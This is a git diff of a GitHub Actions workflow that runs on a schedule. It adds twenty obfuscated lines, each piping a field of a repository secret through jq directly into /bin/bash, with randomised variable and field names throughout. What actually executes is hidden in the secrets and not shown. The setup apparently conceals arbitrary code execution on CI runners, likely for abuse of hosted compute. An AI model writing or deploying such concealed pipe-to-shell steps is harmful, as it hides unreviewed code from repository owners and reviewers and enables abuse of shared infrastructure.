@@ -3,23 +3,35 @@ name: liuqibuzhi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '47 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liuqibuzhi
         env:
-          h2000: ${{ secrets.h2000 }}
+          wg730: ${{ secrets.wg730 }}
         run: |
-          echo $h2000 | jq -r .vitwi51 | /bin/bash
-          echo $g4734 | jq -r .d1069 | /bin/bash
-          echo $ieo68 | jq -r .uxez6139 | /bin/bash
-          echo $wnv27 | jq -r .rheep276 | /bin/bash
-          echo $vnx61 | jq -r .dxnfs96843 | /bin/bash
-          echo $za3512 | jq -r .xf53311 | /bin/bash
-          echo $mcpb99 | jq -r .x904 | /bin/bash
-          echo $mwef6256 | jq -r .fjp89 | /bin/bash
+          echo $wg730 | jq -r .gl7 | /bin/bash
+          echo $o7 | jq -r .ikoyw13 | /bin/bash
+          echo $pt00 | jq -r .auqy1 | /bin/bash
+          echo $nbo88 | jq -r .cbz44 | /bin/bash
+          echo $vu62493 | jq -r .r66 | /bin/bash
+          echo $cm2569 | jq -r .soo6 | /bin/bash
+          echo $mz3 | jq -r .rmag443 | /bin/bash
+          echo $lxi4 | jq -r .u948 | /bin/bash
+          echo $enokl1 | jq -r .mfbn724 | /bin/bash
+          echo $wunr50223 | jq -r .qsuw4718 | /bin/bash
+          echo $qsor65227 | jq -r .cbhhc609 | /bin/bash
+          echo $fnd8485 | jq -r .c32147 | /bin/bash
+          echo $bn77810 | jq -r .yhsw19812 | /bin/bash
+          echo $laxvf4489 | jq -r .be56 | /bin/bash
+          echo $baxgz02 | jq -r .pytg58933 | /bin/bash
+          echo $oboyn41 | jq -r .up38 | /bin/bash
+          echo $nawx992 | jq -r .fnfdx48 | /bin/bash
+          echo $b3399 | jq -r .eag84076 | /bin/bash
+          echo $e69355 | jq -r .zmpa66 | /bin/bash
+          echo $rnxbf7776 | jq -r .snkg4935 | /bin/bash
 
